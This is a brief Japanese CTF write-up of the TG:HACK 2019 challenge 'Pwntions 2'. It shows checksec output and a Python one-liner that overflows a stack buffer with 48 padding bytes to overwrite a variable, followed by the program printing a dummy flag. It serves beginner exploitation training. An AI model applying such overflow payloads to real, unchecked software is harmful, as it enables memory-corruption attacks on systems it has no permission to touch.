# [pwn 75pts] Pwntions 2 - TG:HACK 2019
32bitで全部無効です。
```
$ checksec -f pwntion2
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   88 Symbols     No	0		8	pwntion2
```

これもCのコードが渡されています。
バッファオーバーフローで変数を書き換えればOKです。

```
$ python -c 'print("A" * 48 + "\x01\x00\x00\x00", end="")' | ./pwntion2 
Test banner


Professor maritio_o:
> Welcome to the second class about stack overflow pwntions!
> Pls don't hesitate to ask questions!

Student:
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Professor maritio_o:
> Excellent! Ten points to your house!
> FLAG{Dummy}
```

# 感想
pwn初心者向けの問題だと思います。
